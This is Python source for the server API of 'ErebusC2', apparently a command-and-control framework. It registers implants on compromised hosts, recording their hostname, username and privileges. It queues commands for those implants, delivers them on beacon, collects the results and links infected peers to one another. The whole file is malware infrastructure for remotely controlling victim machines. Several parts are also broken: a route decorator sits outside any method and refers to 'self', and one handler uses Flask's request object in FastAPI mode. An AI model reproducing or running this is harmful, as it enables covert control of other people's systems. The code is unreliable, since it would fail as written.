"""
ErebusC2 Server API
Handles API communication between the dashboard interface and server backend
"""
import os
import sys
import time
import json
import uuid
import logging
import threading
import queue
import datetime
from typing import Dict, List, Any, Optional, Union, Callable

# FastAPI for modern API implementation
try:
    from fastapi import FastAPI, Request, Response, HTTPException, Depends, status, WebSocket, WebSocketDisconnect
    from fastapi.responses import JSONResponse
    from fastapi.middleware.cors import CORSMiddleware
    from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
    import uvicorn
    HAS_FASTAPI = True
except ImportError:
    HAS_FASTAPI = False
    # Fallback to Flask if FastAPI is not available
    try:
        from flask import Flask, request, jsonify, Response
        from flask_cors import CORS
        HAS_FLASK = True
    except ImportError:
        HAS_FLASK = False

# Import other server components
try:
    from server.peer_tracker import PeerTracker
    from server.command_queue import CommandQueue
    from server.traffic_manager import TrafficManager
except ImportError:
    # Add parent directory to path for local imports
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    try:
        from server.peer_tracker import PeerTracker
        from server.command_queue import CommandQueue
        from server.traffic_manager import TrafficManager
    except ImportError:
        # For initial development - these will be implemented
        class PeerTracker:
            def __init__(self): pass
            def register(self, *args, **kwargs): pass
            def get_implants(self): return []
            def get_relays(self): return []
            def get_implant(self, implant_id): return None
            def get_relay(self, relay_id): return None
            def update_implant(self, implant_id, status): pass
            def update_relay(self, relay_id, status): pass
        
        class CommandQueue:
            def __init__(self): pass
            def add_command(self, *args, **kwargs): return str(uuid.uuid4())
            def get_pending_commands(self, implant_id): return []
            def get_command_result(self, command_id): return None
            def update_command(self, command_id, status, result): pass
            def get_commands(self): return []
            
        class TrafficManager:
            def __init__(self): pass
            def route_message(self, *args, **kwargs): pass
            def register_handler(self, *args, **kwargs): pass

# Import BlackRelay for communication
try:
    from blackrelay import BlackRelay
except ImportError:
    # Mock for initial development
    class BlackRelay:
        def __init__(self): pass
        def start(self): pass
        def stop(self): pass
        def send_data(self, data, protocol_id=None, session_id=None, metadata=None): return True
        def register_data_handler(self, handler): pass
        def get_status(self): return {"status": "mocked"}


class ServerAPI:
    """API server for ErebusC2"""
    
    def __init__(self, config_path: Optional[str] = None, config_dict: Optional[Dict[str, Any]] = None):
        """Initialize the server API
        
        Args:
            config_path: Path to configuration file
            config_dict: Configuration dictionary
        """
        self.logger = self._setup_logging()
        self.config = self._load_config(config_path)
        self.running = False
        
        # Initialize components
        self.peer_tracker = PeerTracker()
        self.command_queue = CommandQueue()
        self.traffic_manager = TrafficManager()
        
        # Initialize BlackRelay
        self.relay = BlackRelay()
        
        # Set up API server based on available libraries
        self.api_type = None
        self.app = None
        if HAS_FASTAPI:
            self._setup_fastapi()
            self.api_type = "fastapi"
        elif HAS_FLASK:
            self._setup_flask()
            self.api_type = "flask"
        else:
            self.logger.error("No suitable web framework found. Install FastAPI or Flask.")
            raise ImportError("No suitable web framework found. Install FastAPI or Flask.")
        
        # WebSocket connections for real-time updates (FastAPI only)
        self.websocket_connections = set()
        
        # Event queue for pushing updates to connected clients
        self.event_queue = queue.Queue()
        
        # Initialize event handler list
        self.event_handlers = []
        
        self.logger.info("Server API initialized")
    
    def _setup_logging(self) -> logging.Logger:
        """Set up logging
        
        Returns:
            Configured logger
        """
        logger = logging.getLogger("ErebusC2.ServerAPI")
        logger.setLevel(logging.INFO)
        
        # Create handlers
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler("server_api.log")
        c_handler.setLevel(logging.INFO)
        f_handler.setLevel(logging.DEBUG)
        
        # Create formatters
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        c_handler.setFormatter(formatter)
        f_handler.setFormatter(formatter)
        
        # Add handlers to logger
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        
        return logger
    
    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load configuration from file
        
        Args:
            config_path: Path to the configuration file
            
        Returns:
            Configuration dictionary
        """
        try:
            import yaml
            with open(config_path, 'r') as f:
                config = yaml.safe_load(f)
                
            self.logger.debug(f"Loaded configuration from {config_path}")
            return config
        except Exception as e:
            self.logger.error(f"Error loading configuration from {config_path}: {e}")
            return {
                "api": {
                    "host": "0.0.0.0",
                    "port": 8000,
                    "debug": False,
                    "ssl": False,
                    "cert_file": "server.crt",
                    "key_file": "server.key",
                    "token_secret": "changeme",
                    "cors_origins": ["*"]
                },
                "server": {
                    "implant_timeout": 300,  # seconds
                    "command_timeout": 600,  # seconds
                    "max_queue_size": 1000
                }
            }
    
    def _setup_fastapi(self):
        """Set up FastAPI server"""
        self.app = FastAPI(
            title="ErebusC2 API",
            description="API for ErebusC2 Command & Control Server",
            version="1.0.0"
        )
        
        # Configure CORS
        origins = self.config.get("api", {}).get("cors_origins", ["*"])
        self.app.add_middleware(
            CORSMiddleware,
            allow_origins=origins,
            allow_credentials=True,
            allow_methods=["*"],
            allow_headers=["*"],
        )
        
        # Authentication
        token_secret = self.config.get("api", {}).get("token_secret", "changeme")
        token_bearer = HTTPBearer()
        
        # Authentication dependency for protected endpoints
        async def authenticate(credentials: HTTPAuthorizationCredentials = Depends(token_bearer)):
            if credentials.credentials != token_secret:
                raise HTTPException(
                    status_code=status.HTTP_401_UNAUTHORIZED,
                    detail="Invalid authentication credentials",
                    headers={"WWW-Authenticate": "Bearer"},
                )
            return True
        
        # Root endpoint
        @self.app.get("/")
        async def root():
            return {"message": "ErebusC2 API", "version": "1.0.0"}
        
        # Health check endpoint
        @self.app.get("/health")
        async def health_check():
            return {"status": "ok", "timestamp": time.time()}
        
        # API endpoints
        
        # Implant management
        @self.app.get("/api/implants", dependencies=[Depends(authenticate)])
        async def get_implants():
            implants = self.peer_tracker.get_implants()
            return {"implants": implants}
        
        @self.app.get("/api/implants/{implant_id}", dependencies=[Depends(authenticate)])
        async def get_implant(implant_id: str):
            implant = self.peer_tracker.get_implant(implant_id)
            if not implant:
                raise HTTPException(status_code=404, detail="Implant not found")
            return implant
        
        @self.app.post("/api/implants/{implant_id}/command", dependencies=[Depends(authenticate)])
        async def send_command(implant_id: str, request: Request):
            data = await request.json()
            
            command_type = data.get("type")
            command_params = data.get("params", {})
            
            if not command_type:
                raise HTTPException(status_code=400, detail="Command type is required")
            
            # Add command to queue
            command_id = self.command_queue.add_command(
                implant_id=implant_id,
                command_type=command_type,
                params=command_params
            )
            
            return {"command_id": command_id}
        
        # Command management
        @self.app.get("/api/commands", dependencies=[Depends(authenticate)])
        async def get_commands():
            commands = self.command_queue.get_commands()
            return {"commands": commands}
        
        @self.app.get("/api/commands/{command_id}", dependencies=[Depends(authenticate)])
        async def get_command(command_id: str):
            command = self.command_queue.get_command_result(command_id)
            if not command:
                raise HTTPException(status_code=404, detail="Command not found")
            return command
        
        # Relay management
        @self.app.get("/api/relays", dependencies=[Depends(authenticate)])
        async def get_relays():
            relays = self.peer_tracker.get_relays()
            return {"relays": relays}
        
        @self.app.get("/api/relays/{relay_id}", dependencies=[Depends(authenticate)])
        async def get_relay(relay_id: str):
            relay = self.peer_tracker.get_relay(relay_id)
            if not relay:
                raise HTTPException(status_code=404, detail="Relay not found")
            return relay
        
        # Server status and management
        @self.app.get("/api/status", dependencies=[Depends(authenticate)])
        async def get_status():
            relay_status = self.relay.get_status()
            implant_count = len(self.peer_tracker.get_implants())
            relay_count = len(self.peer_tracker.get_relays())
            queued_commands = len(self.command_queue.get_commands())
            
            return {
                "status": "running" if self.running else "stopped",
                "uptime": time.time() - self.start_time if hasattr(self, "start_time") else 0,
                "implants": implant_count,
                "relays": relay_count,
                "commands_queued": queued_commands,
                "relay_status": relay_status
            }
        
        # WebSocket endpoint for real-time updates
        @self.app.websocket("/ws")
        async def websocket_endpoint(websocket: WebSocket):
            await websocket.accept()
            self.websocket_connections.add(websocket)
            
            try:
                # Send initial status
                await websocket.send_json({
                    "type": "status",
                    "data": {
                        "implants": len(self.peer_tracker.get_implants()),
                        "relays": len(self.peer_tracker.get_relays()),
                        "commands": len(self.command_queue.get_commands())
                    }
                })
                
                # Keep connection alive
                while True:
                    # Wait for messages from client (e.g., for subscriptions or commands)
                    data = await websocket.receive_text()
                    try:
                        message = json.loads(data)
                        if message.get("type") == "ping":
                            await websocket.send_json({"type": "pong", "timestamp": time.time()})
                    except:
                        pass
                    
            except WebSocketDisconnect:
                pass
            finally:
                self.websocket_connections.remove(websocket)
        
        self.logger.info("FastAPI server configured")
    
    def _setup_flask(self):
        """Set up Flask server"""
        self.app = Flask(__name__)
        
        # Configure CORS
        origins = self.config.get("api", {}).get("cors_origins", ["*"])
        CORS(self.app, origins=origins)
        
        # Authentication check function
        def authenticate():
            token_secret = self.config.get("api", {}).get("token_secret", "changeme")
            auth_header = request.headers.get('Authorization')
            
            if not auth_header or not auth_header.startswith('Bearer '):
                return False
                
            token = auth_header.split(' ')[1]
            return token == token_secret
        
        # Root endpoint
        @self.app.route('/')
        def root():
            return jsonify({"message": "ErebusC2 API", "version": "1.0.0"})
        
        # Health check endpoint
        @self.app.route('/health')
        def health_check():
            return jsonify({"status": "ok", "timestamp": time.time()})
        
        # API endpoints
        
        # Implant management
        @self.app.route('/api/implants')
        def get_implants():
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            implants = self.peer_tracker.get_implants()
            return jsonify({"implants": implants})
        
        @self.app.route('/api/implants/<implant_id>')
        def get_implant(implant_id):
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            implant = self.peer_tracker.get_implant(implant_id)
            if not implant:
                return jsonify({"error": "Implant not found"}), 404
                
            return jsonify(implant)
        
        @self.app.route('/api/implants/<implant_id>/command', methods=['POST'])
        def send_command(implant_id):
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            data = request.get_json()
            
            command_type = data.get("type")
            command_params = data.get("params", {})
            
            if not command_type:
                return jsonify({"error": "Command type is required"}), 400
            
            # Add command to queue
            command_id = self.command_queue.add_command(
                implant_id=implant_id,
                command_type=command_type,
                params=command_params
            )
            
            return jsonify({"command_id": command_id})
        
        # Command management
        @self.app.route('/api/commands')
        def get_commands():
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            commands = self.command_queue.get_commands()
            return jsonify({"commands": commands})
        
        @self.app.route('/api/commands/<command_id>')
        def get_command(command_id):
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            command = self.command_queue.get_command_result(command_id)
            if not command:
                return jsonify({"error": "Command not found"}), 404
                
            return jsonify(command)
        
        # Relay management
        @self.app.route('/api/relays')
        def get_relays():
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            relays = self.peer_tracker.get_relays()
            return jsonify({"relays": relays})
        
        @self.app.route('/api/relays/<relay_id>')
        def get_relay(relay_id):
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            relay = self.peer_tracker.get_relay(relay_id)
            if not relay:
                return jsonify({"error": "Relay not found"}), 404
                
            return jsonify(relay)
        
        # Server status and management
        @self.app.route('/api/status')
        def get_status():
            if not authenticate():
                return jsonify({"error": "Unauthorized"}), 401
                
            relay_status = self.relay.get_status()
            implant_count = len(self.peer_tracker.get_implants())
            relay_count = len(self.peer_tracker.get_relays())
            queued_commands = len(self.command_queue.get_commands())
            
            return jsonify({
                "status": "running" if self.running else "stopped",
                "uptime": time.time() - self.start_time if hasattr(self, "start_time") else 0,
                "implants": implant_count,
                "relays": relay_count,
                "commands_queued": queued_commands,
                "relay_status": relay_status
            })
        
        self.logger.info("Flask server configured")
    
    def start(self):
        """Start the API server"""
        if self.running:
            return
            
        self.running = True
        self.start_time = time.time()
        
        # Start components
        self.relay.start()
        self.relay.register_data_handler(self._handle_relay_data)
        
        # Start event broadcasting thread
        self.event_thread = threading.Thread(target=self._broadcast_events)
        self.event_thread.daemon = True
        self.event_thread.start()
        
        # Start API server
        api_config = self.config.get("api", {})
        host = api_config.get("host", "0.0.0.0")
        port = api_config.get("port", 8000)
        debug = api_config.get("debug", False)
        
        # Start in a separate thread to allow the main thread to continue
        self.server_thread = threading.Thread(
            target=self._start_server,
            args=(host, port, debug)
        )
        self.server_thread.daemon = True
        self.server_thread.start()
        
        self.logger.info(f"Server API started on {host}:{port}")
    
    def stop(self):
        """Stop the API server"""
        if not self.running:
            return
            
        self.running = False
        
        # Stop components
        self.relay.stop()
        
        self.logger.info("Server API stopped")
    
    def _start_server(self, host: str, port: int, debug: bool):
        """Start the API server
        
        Args:
            host: Host address
            port: Port number
            debug: Debug mode
        """
        try:
            if self.api_type == "fastapi":
                # Start FastAPI server
                ssl_config = self.config.get("api", {}).get("ssl", False)
                
                if ssl_config:
                    cert_file = self.config.get("api", {}).get("cert_file", "server.crt")
                    key_file = self.config.get("api", {}).get("key_file", "server.key")
                    
                    # Verify files exist
                    if not os.path.exists(cert_file) or not os.path.exists(key_file):
                        self.logger.warning("SSL certificate or key file not found, falling back to HTTP")
                        ssl_config = False
                
                uvicorn.run(
                    self.app,
                    host=host,
                    port=port,
                    ssl_certfile=cert_file if ssl_config else None,
                    ssl_keyfile=key_file if ssl_config else None
                )
            elif self.api_type == "flask":
                # Start Flask server
                ssl_context = None
                ssl_config = self.config.get("api", {}).get("ssl", False)
                
                if ssl_config:
                    cert_file = self.config.get("api", {}).get("cert_file", "server.crt")
                    key_file = self.config.get("api", {}).get("key_file", "server.key")
                    
                    # Verify files exist
                    if os.path.exists(cert_file) and os.path.exists(key_file):
                        ssl_context = (cert_file, key_file)
                    else:
                        self.logger.warning("SSL certificate or key file not found, falling back to HTTP")
                
                self.app.run(
                    host=host,
                    port=port,
                    debug=debug,
                    ssl_context=ssl_context
                )
        except Exception as e:
            self.logger.error(f"Error starting server: {e}")
    
    def _handle_relay_data(self, data: Dict[str, Any]):
        """Handle data received from BlackRelay
        
        Args:
            data: Received data
        """
        try:
            protocol_id = data.get("protocol_id")
            protocol_type = data.get("protocol_type")
            source = data.get("source")
            session_id = data.get("session_id")
            message_data = data.get("data")
            
            if isinstance(message_data, bytes):
                try:
                    message_data = message_data.decode("utf-8")
                except UnicodeDecodeError:
                    # Binary data, leave as bytes
                    pass
                    
            # If message_data is a string, try to parse as JSON
            if isinstance(message_data, str):
                try:
                    message_data = json.loads(message_data)
                except json.JSONDecodeError:
                    # Not JSON, leave as string
                    pass
            
            # Process data based on message type
            message_type = None
            if isinstance(message_data, dict):
                message_type = message_data.get("type")
            
            if message_type == "register":
                # Implant registration
                implant_id = message_data.get("id") or session_id
                self._handle_implant_registration(implant_id, protocol_id, message_data)
            elif message_type == "beacon":
                # Implant beacon
                implant_id = message_data.get("id") or session_id
                self._handle_implant_beacon(implant_id, message_data)
            elif message_type == "result":
                # Command result
                command_id = message_data.get("command_id")
                self._handle_command_result(command_id, message_data)
            elif message_type == "relay_register":
                # Relay registration
                relay_id = message_data.get("id") or session_id
                self._handle_relay_registration(relay_id, protocol_id, message_data)
            elif message_type == "relay_status":
                # Relay status update
                relay_id = message_data.get("id") or session_id
                self._handle_relay_status(relay_id, message_data)
            else:
                # Unknown message type, log and pass to traffic manager
                self.logger.debug(f"Unknown message type from {source} via {protocol_type}: {message_data}")
                self.traffic_manager.route_message(message_data, source, protocol_id, session_id)
                
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "data_received",
                "source": source,
                "protocol": protocol_type,
                "message_type": message_type,
                "timestamp": time.time()
            })
            
        except Exception as e:
            self.logger.error(f"Error handling relay data: {e}")
    
    def _handle_implant_registration(self, implant_id: str, protocol_id: str, data: Dict[str, Any]):
        """Handle implant registration
        
        Args:
            implant_id: Implant ID
            protocol_id: Protocol ID used for communication
            data: Registration data
        """
        try:
            # Extract implant information
            system_info = data.get("SystemInfo", {})
            implant_info = {
                "id": implant_id,
                "hostname": system_info.get("Hostname", "Unknown"),
                "os": system_info.get("Platform", "Unknown"),
                "username": system_info.get("Username", "Unknown"),
                "architecture": system_info.get("Architecture", "Unknown"),
                "protocol_id": protocol_id,
                "registered": datetime.datetime.now().isoformat(),
                "last_seen": datetime.datetime.now().isoformat(),
                "status": "active",
                "privileges": system_info.get("Privileges", "user"),
                "language": system_info.get("Language", "en_US")
            }
            
            # Add network information if available
            if "network" in data:
                implant_info["network"] = data["network"]
                
            # Extract IP address if available
            try:
                if "X-Forwarded-For" in request.headers:
                    implant_info["ip"] = request.headers["X-Forwarded-For"].split(',')[0].strip()
                else:
                    implant_info["ip"] = request.remote_addr
            except:
                # Not in HTTP context
                pass
            
            # Register implant
            self.peer_tracker.register(implant_id, "implant", implant_info)
            
            self.logger.info(f"Implant registered: {implant_id} ({implant_info.get('hostname')})")
            
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "implant_registered",
                "implant_id": implant_id,
                "hostname": implant_info.get("hostname"),
                "os": implant_info.get("os"),
                "timestamp": time.time()
            })
            
        except Exception as e:
            self.logger.error(f"Error handling implant registration: {e}")
    
    def _handle_implant_beacon(self, implant_id: str, data: Dict[str, Any]):
        """Handle implant beacon
        
        Args:
            implant_id: Implant ID
            data: Beacon data
        """
        try:
            # Update implant status
            status_update = {
                "last_seen": datetime.datetime.now().isoformat(),
                "status": "active"
            }
            
            # Add any additional data from beacon
            if "stats" in data:
                status_update["stats"] = data["stats"]
                
            if "network" in data:
                status_update["network"] = data["network"]
                
            # Add peer status if available
            if "Status" in data and "PeerStatus" in data["Status"]:
                status_update["peer_status"] = data["Status"]["PeerStatus"]
                if "connections" in data["Status"]["PeerStatus"]:
                    # Store connected peer IDs for visualization
                    status_update["peers"] = list(data["Status"]["PeerStatus"]["connections"].keys())
                
            # Update implant in peer tracker
            self.peer_tracker.update_implant(implant_id, status_update)
            
            # Get any pending commands
            pending_commands = self.command_queue.get_pending_commands(implant_id)
            
            self.logger.debug(f"Implant beacon: {implant_id} - {len(pending_commands)} pending commands")
            
            # Return pending commands if any
            if pending_commands:
                # Send commands to implant
                response_data = {
                    "type": "commands",
                    "commands": pending_commands
                }
                
                # Get implant info to determine protocol
                implant = self.peer_tracker.get_implant(implant_id)
                protocol_id = implant.get("protocol_id") if implant else None
                
                # Send via relay
                if protocol_id:
                    self.relay.send_data(
                        data=json.dumps(response_data),
                        protocol_id=protocol_id,
                        session_id=implant_id
                    )
                    
                    self.logger.debug(f"Sent {len(pending_commands)} commands to implant {implant_id}")
                    
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "implant_beacon",
                "implant_id": implant_id,
                "timestamp": time.time(),
                "has_commands": len(pending_commands) > 0
            })
            
        except Exception as e:
            self.logger.error(f"Error handling implant beacon: {e}")
    
    def _handle_command_result(self, command_id: str, data: Dict[str, Any]):
        """Handle command result
        
        Args:
            command_id: Command ID
            data: Command result data
        """
        try:
            # Extract result information
            result = data.get("result", {})
            status = data.get("status", "unknown")
            error = data.get("error")
            
            # Update command in queue
            self.command_queue.update_command(
                command_id=command_id,
                status=status,
                result=result,
                error=error
            )
            
            self.logger.info(f"Command result received: {command_id} ({status})")
            
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "command_result",
                "command_id": command_id,
                "status": status,
                "has_error": error is not None,
                "timestamp": time.time()
            })
            
        except Exception as e:
            self.logger.error(f"Error handling command result: {e}")
    
    def _handle_relay_registration(self, relay_id: str, protocol_id: str, data: Dict[str, Any]):
        """Handle relay registration
        
        Args:
            relay_id: Relay ID
            protocol_id: Protocol ID used for communication
            data: Registration data
        """
        try:
            # Extract relay information
            relay_info = {
                "id": relay_id,
                "node_id": data.get("node_id"),
                "role": data.get("role"),
                "protocols": data.get("protocols", []),
                "ip": data.get("ip"),
                "protocol_id": protocol_id,
                "registered": datetime.datetime.now().isoformat(),
                "last_seen": datetime.datetime.now().isoformat(),
                "status": "active"
            }
            
            # Register relay
            self.peer_tracker.register(relay_id, "relay", relay_info)
            
            self.logger.info(f"Relay registered: {relay_id} (role: {relay_info.get('role')})")
            
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "relay_registered",
                "relay_id": relay_id,
                "role": relay_info.get("role"),
                "protocols": relay_info.get("protocols", []),
                "timestamp": time.time()
            })
            
        except Exception as e:
            self.logger.error(f"Error handling relay registration: {e}")
    
    def _handle_relay_status(self, relay_id: str, data: Dict[str, Any]):
        """Handle relay status update
        
        Args:
            relay_id: Relay ID
            data: Status data
        """
        try:
            # Update relay status
            status_update = {
                "last_seen": datetime.datetime.now().isoformat(),
                "status": "active"
            }
            
            # Add any additional data from status update
            if "stats" in data:
                status_update["stats"] = data["stats"]
                
            if "connections" in data:
                status_update["connections"] = data["connections"]
                
            # Update relay in peer tracker
            self.peer_tracker.update_relay(relay_id, status_update)
            
            self.logger.debug(f"Relay status update: {relay_id}")
            
            # Queue event for WebSocket broadcast
            self._queue_event({
                "type": "relay_status",
                "relay_id": relay_id,
                "timestamp": time.time()
            })
            
        except Exception as e:
            self.logger.error(f"Error handling relay status: {e}")
    
    def _broadcast_events(self):
        """Broadcast events to WebSocket clients"""
        while self.running:
            try:
                # Get event with timeout
                try:
                    event = self.event_queue.get(timeout=1.0)
                    
                    # Broadcast to all WebSocket clients
                    if self.api_type == "fastapi" and self.websocket_connections:
                        # Make a copy of connections to avoid modification during iteration
                        connections = self.websocket_connections.copy()
                        
                        for websocket in connections:
                            try:
                                # FastAPI WebSocket broadcast is asynchronous, need to handle differently
                                # This is not ideal but works for simple cases
                                import asyncio
                                loop = asyncio.new_event_loop()
                                asyncio.run(self._send_websocket_event(websocket, event))
                            except Exception as e:
                                self.logger.debug(f"Error broadcasting to WebSocket: {e}")
                                
                    # Mark as done
                    self.event_queue.task_done()
                    
                except queue.Empty:
                    # No event to process
                    pass
            except Exception as e:
                self.logger.error(f"Error in event broadcasting: {e}")
    
    async def _send_websocket_event(self, websocket, event):
        """Send an event to a WebSocket client
        
        Args:
            websocket: WebSocket connection
            event: Event data
        """
        try:
            await websocket.send_json(event)
        except Exception:
            # Remove disconnected clients
            if websocket in self.websocket_connections:
                self.websocket_connections.remove(websocket)
    
    def _queue_event(self, event: Dict[str, Any]):
        """Queue an event for broadcasting
        
        Args:
            event: Event data
        """
        try:
            # Add to event queue
            self.event_queue.put(event)
            
            # Also call any registered event handlers
            for handler in self.event_handlers:
                try:
                    handler(event)
                except Exception as e:
                    self.logger.error(f"Error in event handler: {e}")
                    
        except Exception as e:
            self.logger.error(f"Error queuing event: {e}")
    
    def register_event_handler(self, handler: Callable[[Dict[str, Any]], None]):
        """Register an event handler to receive all events
        
        Args:
            handler: Handler function that takes an event dict
        """
        self.event_handlers.append(handler)
        self.logger.debug("Event handler registered")
    
    @self.app.route('/p2p/discover', methods=['POST'])
    def discover_peers():
        if not authenticate():
            return jsonify({"error": "Unauthorized"}), 401
            
        data = request.get_json()
        
        agent_id = data.get("AgentId")
        network_data = data.get("NetworkData", {})
        
        if not agent_id:
            return jsonify({"error": "Missing AgentId"}), 400
        
        # Find compatible peers for this implant
        compatible_peers = []
        all_implants = self.peer_tracker.get_implants()
        
        for implant in all_implants:
            # Skip self
            if implant["id"] == agent_id:
                continue
                
            # Skip implants without network data
            if "network" not in implant:
                continue
                
            # Check if implant was active recently (last 10 minutes)
            last_seen = implant.get("last_seen")
            if last_seen:
                try:
                    last_seen_time = datetime.datetime.fromisoformat(last_seen)
                    now = datetime.datetime.now()
                    if (now - last_seen_time).total_seconds() > 600:  # 10 minutes
                        # Skip inactive implants
                        continue
                except:
                    pass
            
            # Add to potential peers list
            compatible_peers.append({
                "AgentId": implant["id"],
                "NetworkData": implant.get("network", {})
            })
            
            # Limit to reasonable number
            if len(compatible_peers) >= 5:
                break
        
        # Update this implant with network data
        self.peer_tracker.update_implant(agent_id, {"network": network_data})
        
        # Return list of potential peers
        return jsonify({
            "Status": "Success",
            "Peers": compatible_peers
        })


def create_server_api(config_path: Optional[str] = None):
    """Create a new server API instance
    
    Args:
        config_path: Path to configuration file (optional)
        
    Returns:
        ServerAPI instance
    """
    return ServerAPI(config_path)


if __name__ == "__main__":
    # Set up logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Create and start the server API
    server = create_server_api()
    server.start()
    
    try:
        # Keep running until interrupted
        import time
        print("ErebusC2 Server API started, press Ctrl+C to stop")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping server...")
    finally:
        server.stop()